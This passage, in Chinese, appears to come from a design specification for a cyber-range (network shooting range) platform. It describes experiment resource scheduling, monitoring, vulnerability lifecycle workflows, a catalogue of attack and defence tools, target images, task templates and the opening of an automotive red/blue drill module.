data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/dbd3082c1a2d38efe1c843083bcb10ef.png"></p><p>测评资源调度功能结构图</p><p>配置解析功能起着桥梁的作用，将由配置管理界面生成的配置文件进行详尽解析，以此来确定需要构建的测试环境针对基础虚拟网络、虚拟节点以及虚实连接所必需的资源规模。配置管理界面的工具利用这些配置接口，直接将系统中环境变更的需求转换成具体的任务，并依次将这些任务排入任务队列中待处理。</p><p>为了评估测试环境所需的虚拟资源，系统提供一系列算法。这些算法能够计算出虚拟网络和节点所需的资源量，比如网络资源数、CPU资源数、内存及存储资源数。这种评估将考虑到当前系统中可使用的空闲虚拟资源，并据此判断系统是否有能力支持构建预定的测试环境。</p><p>任务管理部分则是将环境的需求转化为实际的配置任务，这些任务会根据它们之间的依赖关系进行排序，并添加到任务队列中。此外，它还负责维护和控制这些任务间的依赖关系。</p><p>异常处理部分致力于监控任务的执行状态，对于超时未完成或发生故障的任务提供相应的处理机制。确保系统的鲁棒性和可靠性。</p><p>任务结果管理模块充当消息总线的回调机制，根据底层系统返回的任务执行情况，处理和反馈结果信息。通过这些模块的协同工作，系统确保了任务的顺利执行和及时准确的状态反馈，为用户管理和维护测试环境提供了强有力的支持。</p><p>1）配置解析功能</p><p>配置解析模块的主要作用是对由配置管理界面所生成的配置文件进行详细的解码工作，这将揭示所需生成的网络环境的拓扑结构。该模块负责分析拓扑结构和其参数设置，从而得出构成该拓扑所需的子网分割、节点定义和连接关系。</p><p>配置文件本身采用了标准的XML格式，系统内部定义了该格式以描述网络环境的特定方面。当配置文件被传递至系统时，一个专用的XML解析器被调用以提取出配置文件中定义的网络组件信息，如虚拟和实体的子网、它们的互联关系，以及其他关键配置详情。</p><p>更具体地，XML解析器能够逐项读取配置文件中规定的虚拟子网设置、虚拟子网间的连线关系、实体子网的特征和它们的连接方式、虚拟和实体网络的交互连接方式，另外还包括数据采集和监控设置以及软件部署指令。此外，每个虚拟子网需部署的虚拟节点数量和属性，以及诸如协议栈节点之类的详细要求也会被解析并准备好以供后续的配置部署。</p><p>系统设计这种解析流程是为了确保网络环境的准确构建，同时提供所需网络模拟详尽的参数化配置，从而使网络管理员或者研究人员能够定制和部署复杂的网络测试环境。这种方法的实施保障了网络环境创建的透明度和重现性，满足不同用户对于网络配置的管理需求。</p><p>2）资源评估功能</p><p>(1）虚拟资源评估</p><p>虚拟资源评估功能负责分析和确定系统是否具备构建配置文件所描述的目标网络环境所需的全部资源。这一过程涉及到多种虚拟资源的核算，包括网络资源如VLAN和公共IP地址，以及计算资源包括CPU、内存和硬盘空间。</p><p>评估操作涵盖对每个虚拟节点所需计算资源的总量—如CPU时钟频率、内存容量和存储空间—进行仔细估算，并对网络部分，如VLAN数量和公共IP地址的使用，进行准确盘点。这一连串计算行动的目的在于确保系统在资源分配上能够满足测试床网络环境构建的所有需求。</p><p>整个评估流程是为确保在实际配置之前，所需的每一项资源都得以妥善准备和规划，从而避免在构建或运行时发生资源短缺，保障实验环境的稳定运行和测试的准确性。通过对虚拟资源的评估，管理员能够对资源使用进行优化，确保测试网络环境的高效配置与运行。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/586cf3637013d4d00ddd796817479a9c.png"></p><p>虚拟资源</p><p>虚拟资源评估的方法是：</p><p>进行虚拟资源的评估时，首先需在每个子网内部进行资源占用的统计。这包括累加每台虚拟机所使用的CPU核心数、内存大小以及硬盘存储量。这样做可以得到整个子网所需要的资源总量。</p><p>系统将对所有子网进行同样的计算，将各个子网所需的CPU、内存和硬盘资源进行汇总，从而得出构建整个环境所需要的总资源量。这个总量是决定系统能否支持设定环境的关键因素。</p><p>同时，系统还需统计所有子网占用的外部IP地址数量，以及子网的总数，这些信息用来计算整个网络环境所需要的外部网络接口数量和VLAN资源。这一系列的累计和统计活动，为了确保环境的资源需求量不会超出系统的承载能力，从而可以顺利地构建和运行预定的虚拟网络环境。</p><p>(2）实物资源评估</p><p>资源评估在构建和管理虚拟网络环境时扮演着重要的角色，它可以手动执行，也可以通过自动化算法完成。</p><p>在手动评估过程中，管理员利用配置管理服务模块的用户界面来指定资源的预分配。通过这一界面，管理员可以根据网络环境的需求和可用资源的具体情况，有选择性地为各个组件指派资源。这种方法依赖于管理员对当前系统状态和工作负载要求的深入了解。完成资源的分配后，系统会生成一个包含所有资源分配详情的配置文件，然后发送到虚拟网络的相应子系统，以便进一步处理和实施。</p><p>对于自动完成的资源评估，则是基于既定的负载均衡算法来进行。这些算法考虑到网络内的资源使用效率和平衡性，可以自动计算资源分配方案。自动评估方法能最小化人工操作，减少配置错误，优化资源利用，并保证服务质量。自动化系统会根据算法提供的结果自动配置网络环境，减轻管理员的工作负担。</p><p>无论是手动还是自动资源评估，目的都是保证虚拟网络环境能够充分利用系统资源，同时满足测试和运营的需求。</p><p>.测评试验并行管理</p><p>系统能并行支撑多个工程，即多个目标网络环境的模拟，目标网络环境之间是通过三层路由实现安全隔离的，如果试验环境之间需要通信可以通过访问控制策略配置来实现，该系统至少可以同时支撑多个以上的网络环境的部署和运行。并支持多个人员同时对同一个工程进行编辑与管理。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c945f9197cc00250e7d220140f0ebb40.png"></p><p>试验人员管理</p><p>在系统中，将对编辑的人员进行授权，纳入到工程中，用户就可以分别用自己的账号进行编辑与管理。</p><p>测评试验运行管理</p><p>试验运行管控主要对试验过程控制，、包括试验环境构建过程管理、试验运行进程控制，可根据试验任务配置方案启动相关试验环绕的构建过程，支持控制试验的开始、暂停、继续、回滚、回放、停止、科目更换和资源回收等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3eaba8d0e2c258594e87ed3376cb22e0.png"></p><p>试验开始、停止控制</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1561c919000a75125aeb8bca2968a261.png"></p><p>试验暂停控制</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/70991c1e123e07695d51b6c8c3203968.png"></p><p>试验回放控制</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/67d7cd1ee8a138cdc652f43d34b6f52d.png"></p><p>科目更换控制</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/78ba68e57e89cd43da70107d8770a1e3.png"></p><p>试验回滚</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/34d223d6761c6ac24596e1369c991487.png"></p><p>试验运行控制</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b385a3f784c3a2fbd9bae80420381391.png"></p><p>试验资源回收控制、试验数据保存、试验查询</p><p>系统支持对试验过程的数据进行存储，并可根据存储的数据进行回滚。</p><p>测评试验过程监控</p><p>提供试验过程的可视化监控功能，一方面可通过实时的采集实物和虚拟节点状态信息，经过分析处理，得到虚拟机的内存利用率、 CPU利用率、硬盘利用率、网卡流量和进程信息等，经过与配置的阈值比较，产生告警信息，并在界面显示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6a0685abfa6d50f1347bbccafb77ba04.png"></p><p>试验过程告警监控</p><p>另一方面对在测试过程中，实时采集数据、过滤数据并分析评估转换成图形的信息展示，系统支持将测试任务分解成多级的子任务，并支持任务进度的管理，支持任务状态的展示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9f2cc3cb314c0da73303acf3f41ceeeb.png"></p><p>试验过程告警监控</p><p>另一方面对在测试过程中，实时采集数据、过滤数据并分析评估转换成图形的信息展示，系统支持将测试任务分解成多级的子任务，并支持任务进度的管理，支持任务状态的展示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4176393f7ba78dcf0b372830c0116a7d.png"></p><p>试验任务状态监控</p><p>支持对试验中的操作日志进行监控以及异常信息告警。具备试验日志记录功能，支持试验日志按用户、用户类型、时间的条件进行查询。</p><p><strong><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a265177ce041e3dc028323b1ee19dcc0.png"></strong></p><p>日志监控与告警</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ccb02c9c1cad75fa56f7542cf2ad82c3.png"></p><p>节点录屏</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/bbbeb4bd411ef93edadbaf6033d119ed.png"></p><p>录屏播放</p><p>虚拟节点数据采集采用基于libvmi和libvirt的采集方式，从运行虚拟机的宿主机上，获取虚拟机的运行状态信息包括CPU利用率、内存利用率、硬盘利用率、磁盘IO、网络流量、TCP连接信息、UDP连接信息等信息。支持虚拟机节点自动发现崩溃、无响应等状态。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/54c36337cb482627b1367e1ffadb404b.png"></p><p>虚拟机运行状态监控</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/55efd983eea4902560df7c77d96b781d.png" alt="C:\\Users\\Administrator\\Documents\\Tencent Files\\275129700\\Image\\C2C\\Image1\\@XH_Q%ZO\`3}6B0FH\`Z)4T14.png"></p><p>虚拟机事件监控</p><p>系统支持虚拟机从崩溃中自动恢复到初始状态或手动选择崩溃节点的处理方式，处理方式包括查看虚拟节点状态、重启、重置等操作。支持虚拟节点状态保存和恢复，并提供配置接口，每个虚拟机支持保存2个状态。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8c22a3f95448bb3f022f316a4cbb116d.png"></p><p>虚拟机状态控制与恢复</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/86cd3950456b5d49efbf2a0a4dabe50a.png"></p><p>虚拟机宏观概况</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9f17d7465a3055e2914360d5708ebafc.png"></p><p>虚拟机流量监控</p><p>测评试验攻防事件</p><p>为了使系统更具灵活性，需要对一些影响系统运行的值，做出可变化的设置，以便系统的扩展。系统参数配置管理提供系统的全局配置功能，包括字典的配置、初始化或运行期系统参数的配置以及一些专用配置，譬如态势事件定义配置等。系统支持试验事件管理，对试验事件的关联分析并形成事件关联列表，支持关联事件查询统计，可根据事件类型、来源、发生时间、严重程度等对事件关联列表进行过滤查询。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8db8b60792e024cd11ba10cee9dcd7ac.png"></p><p>系统事件配置</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4de3e3c5ca841fbe253954c59e77f9b9.png"></p><p>事件参数配置</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/be0fb5bb3fe642735fb87167518503e6.jpeg"></p><p>试验事件展示</p><p>测评试验回放</p><p>系统通过试验态势数据展示模块为试验过程中的攻防态势提供可视化服务，通过定义规则，系统从将从宿主机、网络流量采集的数据，经过流处理规则的过滤，在过滤出特定的数据时，产生一个事件，该事件驱动与事件相关联的任务，完成对数据的进一步的基于配置规则的分析处理，从而得到需要展示的态势数据，进而界面程序又将台式数据转换为效果展示的数据，在屏幕上展示，以此实现支持以数据驱动事件、事件驱动任务、任务驱动态势、态势驱动效果展示的模式来展示整个试验的态势。包括对试验任务数据的解析、试验任务状态的跟踪、任务事件的驱动和最终的可视化2D/3D展示功能。系统提供台式数据存储服务，并支持使用存储的态势数据进行回放。回放能够根据试验过程中所记录的参试设备配置数据、状态数据、外测数据、综合态势信息等各类作战数据及其时间属性，通过对数据的按时序回放展现整个试验过程，并对回放的进程进行控制。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4cc2248ba5b76d885cdf6ac5d15485de.png"></p><p>录屏回放</p><h5 id="安全攻防资源管理子模块"><a href="#安全攻防资源管理子模块" class="headerlink" title="安全攻防资源管理子模块"></a>安全攻防资源管理子模块</h5><h6 id="功能性能设计"><a href="#功能性能设计" class="headerlink" title="功能性能设计"></a>功能性能设计</h6><p>具备知识库管理功能，支持知识的查询和更新导入。</p><p>具备攻防和测评任务中发现漏洞的闭环管理能力，支持对漏洞的录入、修复、复测和关闭等流程的管理。</p><p>具备测试工具管理功能，支持对其他系统的工具信息的管理，支持工具信息统一描述和导入；支持对测评场景构建过程中需要的工具、脚本和应用程序的管理。</p><p>系统支持管理虚拟靶标数量不低于2000个，注册管理实物靶标数量不低于1000个。</p><p>具备任务模板管理功能，支持将已有任务配置信息保存为模板，支持配置模板描述，支持任务模板共享，支持导出/导入模板数据。具备场景模板管理功能，支持将已有场景配置信息保存为模板，支持配置模板描述，支持任务模板共享，支持导出/导入模板数据。具备流程模板管理功能，支持将测评任务流程编排数据保存为模板，支持配置模板描述，支持导出和导入模板数据。具备评估策略模板管理功能，支持将已配置的评估策略保存为模板，支持配置模板描述，支持导出和导入模板数据。支持管理模板数不低于10000。</p><h6 id="功能组成设计"><a href="#功能组成设计" class="headerlink" title="功能组成设计"></a>功能组成设计</h6><p>安全攻防资源管理系统保知识库管理、漏洞闭环管理、测试工具管理、测试靶标管理和任务模板管理组成。</p><h6 id="知识库管理"><a href="#知识库管理" class="headerlink" title="知识库管理"></a>知识库管理</h6><p>网络安全知识库具有以下功能:</p><p>支持对安全知识的查询检索,用户可以输入相关关键词进行查询。</p><p>知识支持分类组织和关系关联,用户可以快速定位需要的知识。</p><p>知识库内容包括各类网络安全实体间的复杂关系,如时序、空间、数量、依赖等关系。</p><p>知识可视化呈现,通过图谱展示实体之间的逻辑关联。</p><p>支持知识的导入更新,管理员可以新增编辑知识图谱内容。</p><p>知识抽取自多源安全数据,并利用AI算法不断学习丰富知识图谱。</p><p>知识库为安全态势评估、威胁检测等提供知识支持。</p><p>通过知识关联分析,可以计算出网络环境的安全态势。</p><p>网络安全知识库构建流程</p><p>安全知识的抽取主要对国家安全部门和安全企业的安全公告、安全论坛、安全漏洞库、安全书籍、专家报告、安全工作者社交媒体等信息，采用网络爬虫和自然语言处理技术，基于安全本体，抽取安全实体及其关系，从而构建安全知识图谱。</p><p>安全知识图谱推理是根据安全本体，自动推理生成安全知识图谱中实体间新的关系，合并消解安全实体。安全知识图谱自学习是通过安全事件，基于“假设-验证”推理理论，进行安全知识图谱自学习。安全模式挖掘是离线对安全事件数据集进行频繁模式、序列模式，获得新的安全知识，既而丰富安全知识图谱。安全模式深度学习是离线对安全事件数据集进行深度学习训练，掌握安全模式，从而根据未知安全事件数据集，形成安全知识，丰富安全知识图谱。</p><h6 id="漏洞闭环管理"><a href="#漏洞闭环管理" class="headerlink" title="漏洞闭环管理"></a>漏洞闭环管理</h6><p>漏洞闭环管理是本平台主要的业务功能之一，其管理流程根据登录系统用户的不 同而有所不同。此处将与漏洞闭环管理相关的三种用户(测试人员、开发负责人和开 发人员）分别进行漏洞业务流程的概述。</p><p>测试人员管理漏洞:测试人员进入登录界面，输入验证信息，若验证信息正确则进入相应权限页 面；若验证信息错误，则系统给出提示，需重新输入。测试人员进入系统界面后， 选择漏洞闭环管理模块中的新增漏洞子模块，对漏洞进行详细记录并指派给开发负责 人，经开发负责人确认为漏洞的返回“修改中”漏洞状态，认为不是漏洞的返回 “已拒绝”漏洞状态，测试人员确认拒绝原因后认为不是漏洞的，则修改漏洞状 态为“已确认”并关闭漏洞。开发人员将已修改的漏洞提交给测试人员，测试人 员进行验证，若验证无误后则修改漏洞状态为“已确认”并关闭漏洞，漬验证后 发现仍存在漏洞则重将漏洞提交给开发负责人，循环前面的操作。</p><p>开发负责人管理漏洞:开发负责人进入登录界面，输入验证信息，若验证信息正确则进入相应权限 页面；若验证信息错误，则系统给出提示，需重新输入。开发责任人进入系统界 面后，选择漏洞闭环管理模块的修改漏洞状态子模块，对“新建”状态的漏洞进行验 证，若确定是漏洞的则修改漏洞状态为“修改中”并将漏洞分配给相应的开发人 员，若不认为是漏洞的则修改漏洞状态为“已拒绝”并填写拒绝原因。开发负责 人对开发人员已修改的漏洞进行验证(状态为“待验证”），若确认漏洞已修改则 将漏洞状态修改为“待确认”并提交给测试人员，若认为漏洞未修改好则将漏洞 再分配给开发人员，且此时漏洞状态为“修改中”。</p><p>开发人员管理漏洞:开发人员进入登录界面，输入验证信息，若验证信息正确则进入相应权限页 面；若验证信息错误，则系统给出提示，需重新输入。开发人员进入系统界面后， 选择漏洞闭环管理模块的漏洞分配子模块，明确被分配的漏洞后，再对漏洞进行修改。 若漏洞修改好了则将漏洞状态改为“待验证”并提交给开发负责人。开发负责人 若认为漏洞已修改则修改漏洞状态为“待确认”，若认为修改未修改好则将漏洞 状态修改为“修改中”并将漏洞重新分配给开发人员。</p><p>漏洞闭环管理模块根据不同的用户角色，显示的功能不同，但是它们的基本流程 原理相似。现以测试人员新增漏洞功能为例进行处理流程的概述。新增漏洞的业务流程图如图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a3d87a604cb28ee60b9c690151d55ce5.png"></p><p>：新增漏洞管理流程图</p><p>(1）测试人员发现有未通过测试的用例，点击旁边的“创建漏洞”链接， 触发一个 faultAddBefore.action 请求；</p><p>(2）faultAddBefore.action 请求被 struts.xml 文件拦截并选择 faultAddBeforeAction.java 类处理请求；</p><p>(3）faultAddBeforeAction.java类获取所有已存在的漏洞信息，在这个过程 中 applicationContext.xml 文件实例化 faultAddService 和 faultAddDao,然后将获 取的结果返回给struts.xml ,若果返回的是success结果，则跳转到</p><p>faultAddContext.jsp页面(新增漏洞对话框页面）；</p><p>(4）测试人员输入漏洞信息，点击确定；</p><p>(5）提交信息的post方法触发faultAdd.action请求；</p><p>(6）faultAdd.action 请求被 struts.xml 文件拦截并选择 faultAddAction.java 类 处理请求；</p><p>(7）faultAddAction.java 将 faultAddContext.jsp 页面提交的漏洞信息进行处 理并添加在数据库中，且将返回结果(SUCCESS或INPUT）传送给struts.xml,让 其选择相应的返回页面，若返回的是“SUCCESS”则跳转到用户管理页面</p><p>(userManager.jsp）,若返回的是”INPUT”(漏洞ID已存在）则跳转到新增漏洞 对话框页面(faultAddContext.jsp）；</p><p>(8）新增操作执行后，向LogRecord类发出调用refresh(）方法的消息进行 日志的记录操作。</p><p>漏洞闭环管理是对漏洞进行新增、修改状态和关闭操作。具有漏洞相关操作的用 户有测试高级工程师、测试人员、开发负责人和开发人员。测试高级工程师可关 闭“已确认”状态的漏洞，测试人员对漏洞有新增、修改状态和关闭操作权限， 开发负责人和开发人员对漏洞有修改状态操作权限。现以测试新增漏洞和修改缺 陷状态为例进行详细叙述。新增漏洞対话框如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/aaf77234bf2a4699539717215a1b447e.jpeg"></p><p>：新增漏洞对话框</p><p>新增对话框中包含以下字段：漏洞ID、漏洞名称、所属模 块，漏洞复现步骤、指派责任人、测试人员、漏洞状态和备注。其中，漏洞ID 是唯一性标识，不可重复,•漏洞名称、所属模块、漏洞复现步骤、指派责任人、 测试人员和漏洞状态是必填项。新增漏洞时，漏洞状态默认为“新建”；点击指 派责任人输入框时出现下拉菜单，下拉菜单内为相关人员名称；当输入已存在的 漏洞ID时，系统需给出“需求ID已存在，请重新输入”的提示；当点击保存时, 若必填字段处为空，则系统给出“请输入必填信息”提示。</p><p>三个用户对修改漏洞状态时的权限有些不同，现以开发人员修改漏洞为例进 行详细叙述。点击一条漏洞记录的修改标识，进入修改漏洞状态的表单，此时的 漏洞ID、漏洞名称、所属模块、漏洞复现步骤为不可编辑状态；点击漏洞状态输 入框，出现下拉菜单，下拉菜单内容为“已拒绝”、“修改中”、“待验证”、“待确 认”和“已确认”，且当漏洞状态被修改为“待验证”（即代表开发人员己修改缺 陷并提交给开发负责人）时，修改漏洞状态表单会比新增漏洞表单多一个“解决 时间”字段且为可编辑状态，而被修改成其它状态时，只显示解决时间字段，但 为不可编辑状态。修改漏洞状态表单如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ec0eae76d0df44aea806619e26e0972a.jpeg"></p><p>：修改漏洞状态对话框</p><h6 id="测试工具管理"><a href="#测试工具管理" class="headerlink" title="测试工具管理"></a>测试工具管理</h6><p>攻防工具库包括常用的攻击软件以及防御软件，具体类型可分为信息搜索、数据纂改与欺骗、拒绝服务攻击、漏洞利用、恶意代码、web攻击、无线网络攻击、网络设备攻击、逆向工具、系统防御等类型。数量在161个，此外还包含有攻击工具或防御工具的主机，如常见Linux系统攻击主机（至少含kali、backtrack、backbox，window的Metasploit等。安防软件包括Bit Defender、趋势、卡巴斯基、诺顿、ESET Nod32、小红伞、MSE、McAfee等防病毒软件1套，Nessus、NeXpose、OpenVAS等漏洞扫描软件1套，Lynis等安全审计软件1套，Nagios、Munin、Pingdom、Graphite、Ganglia、IBM Tivoli NETCOOL等安全监控软件1套，以及反垃圾邮件、应用层防火墙等其他类安防软件。详情如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0fd71d608fed04534dee0a358b718cf7.png"></p><p>：测试工具管理</p><h5 id="测试靶标管理"><a href="#测试靶标管理" class="headerlink" title="测试靶标管理"></a>测试靶标管理</h5><p>提供对试验的虚拟资源进行统一管理。包括虚拟机镜像、Docker镜像、虚拟试验环境、虚拟机节点、Docker容器节点、虚拟链路、安全组、IPs、VLANs等资源的统一调度和管理。主要操作包括：增加、删除、修改、查询和监控。基础虚拟资源中可以定义各种操作系统的镜像，包括Window,Linux等。镜像支持设置虚拟仿真设备的型号、登录用户、登录口令、操作系统及应用软件等。支持对镜像设置密码，当基于镜像生成实例时，能以用户设置的用户名、口令等登录到虚拟机。其他参数可通过配置元数据或者文件的方式进行配置。镜像包括类型台式机、笔记本、服务器、手持终端、路由器、交换机、防火墙、IDS等多种网络节点的镜像，路由器镜像包括有Cisco品牌、Juniper品牌，主机镜像包括Centos、Ubuntu、Debian、Redhat、Kali、Fedora，windows包括Windows XP、Windows 7、Windows Server 2003、Windows Server 2008等32位，64位等20种各种发型版本。</p><p><strong><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1cd54118b0c53cae028bad9db3ef0698.png"></strong></p><p>虚拟靶标管理</p><h5 id="任务模板管理"><a href="#任务模板管理" class="headerlink" title="任务模板管理"></a>任务模板管理</h5><p>任务模板管理是网络靶场中的重要功能，它允许用户将现有的任务配置信息保存为模板，这些模板可以带有描述性信息，还可以与其他用户共享，以及进行导出和导入。类似地，场景模板管理、流程模板管理和评估策略模板管理也都具备类似的功能。这些功能的核心目的是为了提高效率和一致性，允许用户在不同的网络环境中重复使用和共享特定的配置。</p><p>任务模板管理的关键功能包括：</p><p>保存任务配置为模板：用户可以将当前的任务配置保存为模板，他们可以在将来的任务中重新使用这个配置，无需从头开始。</p><p>模板描述：每个模板可以带有描述信息，以帮助用户更好地理解模板的用途和内容。</p><p>共享模板：用户可以选择共享他们创建的任务模板，这对于团队协作和知识共享非常有用。</p><p>导入和导出模板数据：这使用户能够轻松地在不同的系统之间共享和转移模板。</p><p>模板数量管理：系统支持大量模板，确保用户可以管理和组织大量的任务、场景、流程和策略模板。</p><p>任务模板管理的核心优势在于提供了一种标准化的方法来配置和管理网络环境，减少了用户的工作量，提高了工作效率，同时也降低了配置错误的风险。这有利于网络靶场的操作和管理，特别是在需要频繁创建不同网络环境的情况下。通过模板管理，用户可以更轻松地构建、部署和管理网络任务，从而更好地满足各种需求。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b20881a5cd2e4fff4034ee5bca946272.png"></p><p>任务模板管理内部服务</p><p>任务模板管理对模板进行定义时可以通过获取配置文件经由文件分类管理服务进行分类识别，然后经配置文件持久化服务保存至任务模板库，同时在需要任务模板时可以通过配置文件访问服务从模板库中获取模板数据生成相应模板文件。任务模板支持自动化配置，配置内容包括：虚拟网络节点的IP地址、MAC地址等属性，网络配置，方便用户基于模板来配置。其核心实现过程如下：</p><p>配置管理服务最终生成的统一配置文件，如果需要被定义成模板，则发送给任务模板管理模块，经模块中的配置文件分类服务进行过滤，然后按照不同类别的目标网络进行分类，标记为模板。</p><p>被标记为模板的配置文件经配置文件持久化服务处理后，变成可被保存到关系型数据库格式的数据。与此同时，数据也被持久化到相应库中。</p><p>被保存为任务模板的网络拓扑，在用户发出请求后，经配置管理界面模块和服务模块，下发获取请求，至该模块的配置文件访问服务。</p><p>配置文件访问服务从任务模板库中读取指定的模板数据，然后组装生成一份配置文件，发送给配置文件分类管理服务。</p><p>配置文件分类管理服务收到来自访问服务生成的配置文件后，依照其标识进行分类，返回给配置管理服务模块，供配置管理界面模块展示。</p><p>任务模板支持二次设计，将单独的网络设备编辑好属性，并保存。在新的网络拓扑设计时，如果要用到以前保存好的网络设备，可在左侧的设备窗口中将选中某个设置好属性的设备，组成网络。并支持对任务模板的增删改查的管理。全虚拟化路由器支持自动化配置，使网络管理更加高效。它能够进行动态路由配置，自动更新路由表来适应网络变化。同时，管理员可以设置静态路由的优先级，确保关键流量的优先传输。还可以配置包过滤规则，控制流经路由器的数据包。拥塞控制功能也可以配置，以管理网络在高流量时的表现。为简化这一过程，目标网络的配置数据提供了易于使用的设计界面接口，允许用户利用模板快速配置网络设置。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/38ca4e1c7cd803ed3a7a5d67508182f6.png"></p><p>任务模板管理</p><p>在新建任务模板时，从已有的任务模板选择导入，并重新命名即可，如图所示：</p><p>![C:\Users\Administrator\Documents\Tencent Files\275129700\Image\C2C\Image1\]47T39SP(_G}K<a href="https://focu5.oss-accelerate.aliyuncs.com/media/ee2fd47542d3864428434e2b0824715c.png">6GZQ3HEVC.png</a></p><p>任务模板配置</p><p>网络拓扑可灵活重构虚拟网络的拓扑结构，无论是二层试验网、三层子网还是包括各类集群的混合型复杂网络都可以自由的重构，与底层物理网络拓扑无关。</p><p>模板中支持试验设备参数的批量配置，配置内容包括操作系统安装分布、安全防御配置分布、网络服务分布、客户端分布等。</p><h3 id="汽车安全演练模块"><a href="#汽车安全演练模块" class="headerlink" title="汽车安全演练模块"></a>汽车安全演练模块</h3><h4 id="功能实施方案-10"><a href="#功能实施方案-10" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>系统提供两种渗透演练模式：顺序闯关和随机闯关。在顺序闯关模式中，演练人员须按照渗透训练场景的任务顺序完成任务，系统会实时显示下一个任务，增强演练的连贯性和指导性。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2fa1e3d7ba2fa8305fcbe9b209a04481.png"></p><ol start="2"><li><p>演练过程中，系统支持渗透成果的提交，如特征码和证据文档。裁判端具备下载和审核提交成果的功能，可对演练人员的成果给予评价，确保演练结果的准确性和公正性。</p></li><li><p>系统具备定义红蓝对抗演练场景的能力，可配置红蓝队伍角色，并为双方分配不同的演练任务。还支持设置场景内不同设备的访问权限，提升演练的安全性和真实感。</p></li><li><p>支持红蓝对抗过程中的周期性对抗模式，根据设定周期为红蓝双方计算积分，增加演练的竞技性和挑战性。</p></li><li><p>系统能够统计红蓝队伍和演练人员的得分，按照攻击得分、防守得分、异常检测扣分等计分规则进行统计，确保成绩评估的全面性和客观性。</p></li><li><p>系统支持对蓝方靶标状态进行周期性检测，允许用户配置检测内容和检测脚本。配置参数包括但不限于检测周期、指令、参数、系统、协议、端口和设备（如设备名称、IP地址、操作系统）以及描述字段。该功能的实现增强了对蓝方靶标的监控能力，确保了靶标的稳定性和安全性。。</p></li><li><p>蓝方参与者可以提交防御报告，系统中裁判功能支持对蓝方提交的报告进行审核和评分。裁判的审核机制保证了演练中防御策略的有效性和合理性评估。</p></li><li><p>系统支持综合演练场景的网络